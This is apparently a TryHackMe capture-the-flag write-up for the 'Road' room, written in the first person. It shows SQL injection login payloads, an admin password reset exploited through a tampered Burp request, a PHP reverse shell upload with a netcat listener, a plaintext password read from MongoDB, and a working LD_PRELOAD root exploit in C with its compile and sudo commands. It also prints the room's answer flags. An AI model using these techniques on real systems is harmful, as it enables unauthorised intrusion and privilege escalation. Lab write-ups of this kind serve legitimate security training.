---
layout: default
title: Road - TryHackMe Writeup
---

[← Back to TryHackMe write-ups](/thm)

# Road

**Difficulty:** Medium  
**Room:** Inspired by a real-world pentesting engagement.

## Enumeration

I started with nmap to find the open ports:

```
nmap -sV -sC -vv -T4 10.10.9.133
```

After a minute or two it found two open ports:

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![nmap results](/THM/images/road/01.png)

Port 80 was the only interesting one for now. It hosted a website called Sky Couriers, and at first there didn't seem to be much on it.

![Sky Couriers website](/THM/images/road/02.png)

I used gobuster with the `common.txt` list from the dirb wordlists to look for directories:

```
gobuster dir -u http://10.10.9.133/ -w /usr/share/wordlists/dirb/common.txt
```

After a minute or two it found two interesting directories: `v2` and `phpMyAdmin`.

![gobuster results](/THM/images/road/03.png)

I checked phpMyAdmin first and tried the default credentials (`root` with a blank password), then several other default admin credentials. It was a dead end.

![phpMyAdmin login](/THM/images/road/04.png)

## Discovery

The other directory, `v2`, had a login page.

![v2 login page](/THM/images/road/05.png)

I tried a few SQL injection payloads to get into an admin account, but none worked.

Payload: `1=1 OR ''` (unsuccessful)

![SQLi attempt 1](/THM/images/road/06.png)

Payload: `admin' or '1'='1` (unsuccessful)

![SQLi attempt 2](/THM/images/road/07.png)

Payload: `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055` (unsuccessful)

![SQLi attempt 3](/THM/images/road/08.png)

After about 15 minutes of failed attempts, I registered an account to see what I could find once logged in.

![Registering an account](/THM/images/road/09.png)

Once logged in there were many options in the sidebar.

![Dashboard](/THM/images/road/10.png)

I looked around the site, then checked my profile for anything I could edit to get a foothold. At the very bottom I found the admin's email address with a message.

![Admin email on the profile page](/THM/images/road/11.png)

Selecting a profile image was meant to be admin only, but I tried anyway in case of a misconfiguration. I named a PHP reverse shell `shell.jpg.php` to try to pass it off as an image and uploaded it.

![Uploading shell.jpg.php](/THM/images/road/12.png)

I clicked Edit Profile at the bottom left and hoped for a shell.

![Edit profile](/THM/images/road/13.png)

It didn't work. My listener on port 4444 got no callback.

![Listener with no callback](/THM/images/road/14.png)

I did now have the admin's email address, `admin@sky.thm`, which might let me change the admin's password. I'd been on the box for almost two and a half hours by this point, so I took a break to avoid burning out.

## Foothold

I came back a few hours later. The Reset User option in the sidebar didn't let me change a different user's password, because the field was greyed out.

![Reset user page](/THM/images/road/15.png)

Burp Suite could help here, so I turned on my proxy in Firefox using the FoxyProxy extension.

![FoxyProxy](/THM/images/road/16.png)

With the proxy on, I entered a new password and intercepted the request in Burp when I pressed submit.

![Intercepted request](/THM/images/road/17.png)

The request contained `test@test` as the `uname` and `test` for both password fields. I changed `test@test` to the admin account, `admin@sky.thm`, to see if I could change its password.

![Changing uname to admin@sky.thm](/THM/images/road/18.png)

I forwarded the request in Burp, and it took me to an interesting page.

![Response page](/THM/images/road/19.png)

I turned the proxy off and tried logging in as the admin with the password I'd just set, `admin@sky.thm:test`.

![Admin login](/THM/images/road/20.png)

It worked. I was logged in as the admin with all the permissions I needed to get a shell.

![Logged in as admin](/THM/images/road/21.png)

In the admin's profile, I could now select a profile image.

![Profile image option](/THM/images/road/22.png)

I uploaded the shell again.

![Uploading the shell as admin](/THM/images/road/23.png)

I started a listener on port 4444, the port set in my PHP script, with `nc -lnvp 4444`. `-l` is for listen, `-n` for numeric only (no DNS lookups), `-v` for verbose and `-p` for the port.

![Starting the listener](/THM/images/road/24.png)

I clicked Edit Profile again but still got no callback. While working out why, I looked through the page source and found a comment hinting at where uploads were stored.

![Comment in the page source](/THM/images/road/25.png)

That directory returned a page saying it was disabled.

![Directory disabled](/THM/images/road/26.png)

So I browsed directly to the file I'd uploaded, `shell.jpg.php`, in that directory, and finally got a shell on the system.

![Reverse shell](/THM/images/road/27.png)

I stabilised the shell with a Python one-liner:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Stabilised shell](/THM/images/road/28.png)

In the home directory I found the user `webdeveloper`, and `user.txt` inside their folder.

![user.txt](/THM/images/road/29.png)

**What is the user.txt flag?** `63191e4ece37523c9fe6bb62a5e64d45`

## Privilege escalation

Before going for root, I needed to become `webdeveloper`, who would have more privileges than `www-data`.

I tried the `find` command first but had no luck.

![find command](/THM/images/road/30.png)

Next I checked which users and services were on the box with `cat /etc/passwd`, and found a MongoDB service that might help.

![/etc/passwd](/THM/images/road/31.png)

I ran `mongo` to open the MongoDB CLI.

![Mongo CLI](/THM/images/road/32.png)

The help commands showed I could list all the databases, so I ran `show dbs`.

![show dbs](/THM/images/road/33.png)

There were four databases: `admin`, `backup`, `config` and `local`.

`backup` looked the most interesting. I ran `use backup`, then `show collections`, and found a collection called `user`.

![show collections](/THM/images/road/34.png)

Running `db.user.find()` revealed a user with a password.

![db.user.find()](/THM/images/road/35.png)

That gave me webdeveloper's credentials:

```
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
```

I switched to webdeveloper successfully.

![Switched to webdeveloper](/THM/images/road/36.png)

Running `sudo -l` showed webdeveloper had sudo permissions that might allow escalation to root.

![sudo -l](/THM/images/road/37.png)

After trying for a while, I called it a night and came back with a fresh start the next day.

The machine came up with a new IP. Since I now had webdeveloper's password, I could log straight in over SSH.

![SSH as webdeveloper](/THM/images/road/38.png)

The `sudo -l` output included `LD_PRELOAD`, so I searched for "LD_PRELOAD privilege escalation" and found [this article](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/), which explained how to escalate to root.

First I moved to `/tmp`.

![cd /tmp](/THM/images/road/39.png)

I created a small C file with `nano priv.c` and added this code:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

![priv.c in nano](/THM/images/road/40.png)

Following the article, I compiled it as a shared library with gcc, then checked with `ls -al` that it had been created:

```
gcc -fPIC -shared -o priv.so priv.c -nostartfiles
```

![Compiled priv.so](/THM/images/road/41.png)

Finally I ran:

```
sudo LD_PRELOAD=/tmp/priv.so sky_backup_utility
```

This gave me a root shell and the root flag.

![Root flag](/THM/images/road/42.png)

**What is the root.txt flag?** `3a62d897c40a815ecbe267df2f533ac6`
